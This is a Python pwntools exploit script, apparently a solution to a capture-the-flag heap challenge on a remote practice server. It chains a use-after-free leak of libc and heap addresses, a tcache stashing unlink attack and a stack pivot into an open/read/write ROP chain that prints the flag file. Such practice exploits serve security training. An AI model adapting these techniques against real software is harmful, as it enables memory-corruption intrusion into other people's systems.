from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-29/ld-2.29.so"
libc_path = "/home/fanxinli/libc-so/libc-2.29-64.so"
# p = process([ld_path, "./RedPacket_SoEasyPwn1"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27935)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(index, size, con):
    sa("Your input: ", "1")
    sa("Please input the red packet idx: ", str(index))
    sa("(1.0x10 2.0xf0 3.0x300 4.0x400): ", str(size))
    sa("Please input content: ", con)

def free(index):
    sa("Your input: ", "2")
    sa("Please input the red packet idx: ", str(index))

def edit(index, con):
    sa("Your input: ", "3")
    sa("Please input the red packet idx: ", str(index))
    sa("Please input content: ", con)

def show(index):
    sa("Your input: ", "4")
    sa("Please input the red packet idx: ", str(index))

def back_door(con):
    sa("Your input: ", "666")
    sa("What do you want to say?", con)


# uaf + stackoverflow

# leak
for i in range(8):
    add(i, 4, "a")  # 0-7
add(8, 1, "a")
for i in range(8):
    free(i)

## leak libc
show(7)
libc_addr = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(libc_addr))

## leak heap
show(1)
heap_addr = u64(rud("\nDone!").ljust(8, b"\x00"))
print("leak: ", hex(heap_addr))

add(9, 4, "a")

# tcache stashing unlink attack
for i in range(6):
    add(i, 2, "a")  # 0-5
for i in range(6):
    free(i)
add(6, 4, "a")
add(7, 1, "a")
add(8, 4, "a")
add(9, 1, "a")
free(6)
free(8)
add(0, 3, "a")
add(1, 3, "a")
add(2, 4, b"flag\x00")

heap_base = (heap_addr & 0xfffffffffffff000) - 0x1000 
tar_addr = heap_base + 0x260 + 0x800
fd = heap_base + 0x4040 
edit(6, cyclic(0x300)+p64(0)+p64(0x101)+p64(fd)+p64(tar_addr-0x10))

add(3, 2, "a")

# use orw code to get flag
libc = ELF(libc_path)
libc_base = libc_addr - libc.sym["__malloc_hook"]-0x70
print("base: ", hex(libc_base))

open_f = libc_base+libc.sym["open"]
read_f = libc_base+libc.sym["read"]
write_f = libc_base+libc.sym["write"]
pop_rdi = libc_base+0x0000000000026542
pop_rsi = libc_base+0x0000000000026f9e
pop_rdx = libc_base+0x000000000012bda6
flag = heap_base+0x4170

code = p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(open_f)
code += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag+0x10)+p64(pop_rdx)+p64(48)+p64(read_f)
code += p64(pop_rdi)+p64(1)+p64(write_f)

add(4, 4, code)

# attack
code_addr = heap_base+0x4580
leave_ret = libc_base+0x58373
pad = cyclic(0x80)+p64(code_addr-0x8)+p64(leave_ret)
back_door(pad)

shell()


